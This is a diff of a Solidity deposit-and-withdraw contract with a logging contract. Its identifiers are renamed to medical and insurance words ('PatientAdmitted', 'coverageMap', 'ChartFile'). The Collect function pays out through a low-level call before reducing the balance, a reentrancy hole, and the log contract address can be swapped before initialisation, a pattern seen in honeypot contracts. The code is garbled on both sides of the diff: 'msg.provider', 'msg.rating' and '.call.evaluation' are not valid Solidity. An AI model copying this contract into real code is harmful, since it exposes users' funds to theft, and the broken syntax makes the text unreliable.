@@ -1,29 +1,27 @@
-*/
-
 pragma solidity ^0.4.19;
 
-contract accural_fundaccount
+contract accural_contributefunds
 {
-    mapping (address=>uint256) public benefitsRecord;
+    mapping (address=>uint256) public coverageMap;
 
-    uint public FloorSum = 1 ether;
+    uint public MinimumSum = 1 ether;
 
-    ChartFile Record = ChartFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
+    RecordFile Record = RecordFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
 
     bool intitalized;
 
-    function GroupFloorSum(uint _val)
+    function CollectionFloorSum(uint _val)
     public
     {
         if(intitalized)revert();
-        FloorSum = _val;
+        MinimumSum = _val;
     }
 
-    function GroupRecordFile(address _log)
+    function CollectionRecordFile(address _log)
     public
     {
         if(intitalized)revert();
-        Record = ChartFile(_log);
+        Record = RecordFile(_log);
     }
 
     function PatientAdmitted()
@@ -32,24 +30,24 @@ contract accural_fundaccount
         intitalized = true;
     }
 
-    function ContributeFunds()
+    function FundAccount()
     public
     payable
     {
-        benefitsRecord[msg.provider]+= msg.rating;
-        Record.AttachNotification(msg.provider,msg.rating,"Put");
+        coverageMap[msg.sender]+= msg.value;
+        Record.InsertAlert(msg.sender,msg.value,"Put");
     }
 
     function Collect(uint _am)
     public
     payable
     {
-        if(benefitsRecord[msg.provider]>=FloorSum && benefitsRecord[msg.provider]>=_am)
+        if(coverageMap[msg.sender]>=MinimumSum && coverageMap[msg.sender]>=_am)
         {
-            if(msg.provider.call.rating(_am)())
+            if(msg.sender.call.evaluation(_am)())
             {
-                benefitsRecord[msg.provider]-=_am;
-                Record.AttachNotification(msg.provider,_am,"Collect");
+                coverageMap[msg.sender]-=_am;
+                Record.InsertAlert(msg.sender,_am,"Collect");
             }
         }
     }
@@ -58,30 +56,30 @@ contract accural_fundaccount
     public
     payable
     {
-        ContributeFunds();
+        FundAccount();
     }
 
 }
 
-contract ChartFile
+contract RecordFile
 {
-    struct Notification
+    struct Alert
     {
         address Referrer;
         string  Chart;
         uint Val;
-        uint  Moment;
+        uint  Instant;
     }
 
-    Notification[] public History;
+    Alert[] public History;
 
-    Notification FinalMsg;
+    Alert FinalMsg;
 
-    function AttachNotification(address _adr,uint _val,string _data)
+    function InsertAlert(address _adr,uint _val,string _data)
     public
     {
         FinalMsg.Referrer = _adr;
-        FinalMsg.Moment = now;
+        FinalMsg.Instant = now;
         FinalMsg.Val = _val;
         FinalMsg.Chart = _data;
         History.push(FinalMsg);
